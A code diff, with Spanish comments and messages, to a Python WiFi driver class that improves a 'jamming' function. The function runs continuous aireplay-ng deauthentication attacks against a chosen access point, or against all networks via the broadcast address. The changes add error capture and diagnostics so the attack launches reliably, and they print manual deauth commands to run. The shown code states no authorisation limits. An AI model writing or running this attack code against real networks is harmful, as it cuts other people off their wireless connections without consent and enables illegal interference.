@@ -869,61 +869,131 @@ class WiFiDriver:
                     cmd = ['sudo', 'aireplay-ng', '--deauth', '0', '-a', target_bssid or 'FF:FF:FF:FF:FF:FF', interface]
                 
                 print(f"Iniciando jamming en {interface}...")
+                print(f"Comando: {' '.join(cmd)}")
+                
+                # Primero, probar si aireplay-ng puede ejecutarse correctamente
+                # Ejecutar una prueba rápida para ver si hay errores inmediatos
+                test_cmd = cmd.copy()
+                # Reemplazar --deauth 0 con --test para verificar inyección
+                if '--deauth' in test_cmd:
+                    deauth_idx = test_cmd.index('--deauth')
+                    test_cmd[deauth_idx + 1] = '1'  # Solo 1 paquete para prueba
                 
                 # Ejecutar en background con mejor manejo
                 try:
-                    # Usar preexec_fn para evitar procesos zombie
+                    # No usar preexec_fn porque puede causar problemas con sudo
                     self.jam_process = subprocess.Popen(
                         cmd, 
                         stdout=subprocess.PIPE, 
-                        stderr=subprocess.PIPE,
-                        preexec_fn=os.setsid if hasattr(os, 'setsid') else None
+                        stderr=subprocess.STDOUT,  # Combinar stderr con stdout
+                        universal_newlines=True,
+                        bufsize=1  # Line buffered
                     )
                 except Exception as e:
                     print(f"ERROR ejecutando aireplay-ng: {e}")
                     return False
                 
-                # Verificar que inició correctamente
-                time.sleep(1.5)  # Más tiempo para que inicie y muestre errores
+                # Leer salida inmediatamente para capturar errores
+                import select
+                error_lines = []
+                start_time = time.time()
+                max_wait = 2.0  # Esperar máximo 2 segundos
                 
+                while time.time() - start_time < max_wait:
+                    if self.jam_process.poll() is not None:
+                        # Proceso terminó, leer toda la salida
+                        remaining_output = self.jam_process.stdout.read()
+                        if remaining_output:
+                            error_lines.append(remaining_output)
+                        break
+                    
+                    # Intentar leer línea si está disponible
+                    if hasattr(self.jam_process.stdout, 'readline'):
+                        try:
+                            # Usar select para verificar si hay datos (solo en Unix)
+                            if hasattr(select, 'select'):
+                                ready, _, _ = select.select([self.jam_process.stdout], [], [], 0.1)
+                                if ready:
+                                    line = self.jam_process.stdout.readline()
+                                    if line:
+                                        error_lines.append(line)
+                                        # Si vemos un error típico, salir temprano
+                                        if any(keyword in line.lower() for keyword in ['error', 'failed', 'cannot', 'unable']):
+                                            time.sleep(0.2)  # Dar tiempo para más salida
+                                            break
+                            else:
+                                # Windows o sin select, esperar un poco
+                                time.sleep(0.2)
+                                break
+                        except:
+                            break
+                    else:
+                        time.sleep(0.2)
+                        break
+                
+                # Verificar si el proceso terminó
                 if self.jam_process.poll() is not None:
-                    # Proceso terminó prematuramente - leer salida completa
+                    # Proceso terminó prematuramente
+                    returncode = self.jam_process.returncode
+                    output = ''.join(error_lines) if error_lines else ""
+                    
+                    # Intentar leer cualquier salida restante
                     try:
-                        stdout, stderr = self.jam_process.communicate(timeout=1)
-                        stdout = stdout.decode('utf-8', errors='ignore') if stdout else ""
-                        stderr = stderr.decode('utf-8', errors='ignore') if stderr else ""
-                    except:
-                        stdout = ""
-                        stderr = ""
-                    
-                    print(f"\nERROR: aireplay-ng terminó inmediatamente (código: {self.jam_process.returncode})")
-                    if stdout:
-                        print(f"STDOUT:\n{stdout}")
-                    if stderr:
-                        print(f"STDERR:\n{stderr}")
-                    
-                    # Diagnóstico adicional
-                    print(f"\nDiagnóstico:")
-                    print(f"  - Interfaz: {interface}")
-                    print(f"  - Modo monitor: {self.monitor_mode}")
-                    print(f"  - Canal actual: {self.current_channel}")
-                    print(f"  - BSSID objetivo: {target_bssid or 'Broadcast'}")
-                    print(f"\nPrueba manualmente:")
-                    print(f"  sudo aireplay-ng --test {interface}")
-                    print(f"  sudo aireplay-ng --deauth 5 -a {target_bssid or 'FF:FF:FF:FF:FF:FF'} {interface}")
-                    
-                    # Limpiar proceso zombie
-                    try:
-                        self.jam_process.wait(timeout=1)
+                        remaining = self.jam_process.stdout.read()
+                        if remaining:
+                            output += remaining
                     except:
                         pass
                     
+                    print(f"\n{'='*60}")
+                    print(f"ERROR: aireplay-ng terminó inmediatamente")
+                    print(f"Código de salida: {returncode}")
+                    print(f"{'='*60}")
+                    if output:
+                        print(f"\nSalida de aireplay-ng:\n{output}")
+                    else:
+                        print("\nNo se capturó salida de aireplay-ng")
+                    
+                    # Diagnóstico adicional
+                    print(f"\n{'='*60}")
+                    print(f"DIAGNÓSTICO:")
+                    print(f"  - Interfaz: {interface}")
+                    print(f"  - Modo monitor: {self.monitor_mode}")
+                    print(f"  - Monitor interface: {self.monitor_interface}")
+                    print(f"  - Canal actual: {self.current_channel}")
+                    print(f"  - BSSID objetivo: {target_bssid or 'Broadcast (FF:FF:FF:FF:FF:FF)'}")
+                    print(f"\nPRUEBAS MANUALES:")
+                    print(f"  1. Verificar inyección:")
+                    print(f"     sudo aireplay-ng --test {interface}")
+                    print(f"  2. Probar deauth manual (5 paquetes):")
+                    print(f"     sudo aireplay-ng --deauth 5 -a {target_bssid or 'FF:FF:FF:FF:FF:FF'} {interface}")
+                    print(f"  3. Verificar modo monitor:")
+                    print(f"     iwconfig {interface}")
+                    print(f"  4. Verificar que la interfaz existe:")
+                    print(f"     ip link show {interface}")
+                    print(f"{'='*60}\n")
+                    
+                    # Limpiar proceso zombie
+                    try:
+                        self.jam_process.wait(timeout=0.5)
+                    except:
+                        try:
+                            self.jam_process.kill()
+                            self.jam_process.wait(timeout=0.5)
+                        except:
+                            pass
+                    
+                    self.jam_process = None
                     return False
                 
-                # Verificar que el proceso realmente esté corriendo
-                print(f"Jamming iniciado (PID: {self.jam_process.pid})")
-                print(f"Verifica con: ps aux | grep {self.jam_process.pid}")
-                print(f"Para detener: jam (de nuevo) o x")
+                # Proceso está corriendo
+                print(f"\n✓ Jamming iniciado correctamente")
+                print(f"  PID: {self.jam_process.pid}")
+                print(f"  Interfaz: {interface}")
+                print(f"  Canal: {self.current_channel}")
+                print(f"  BSSID: {target_bssid or 'Broadcast'}")
+                print(f"\nPara verificar: ps aux | grep {self.jam_process.pid}")
+                print(f"Para detener: jam (de nuevo) o x\n")
                 
                 return True
             
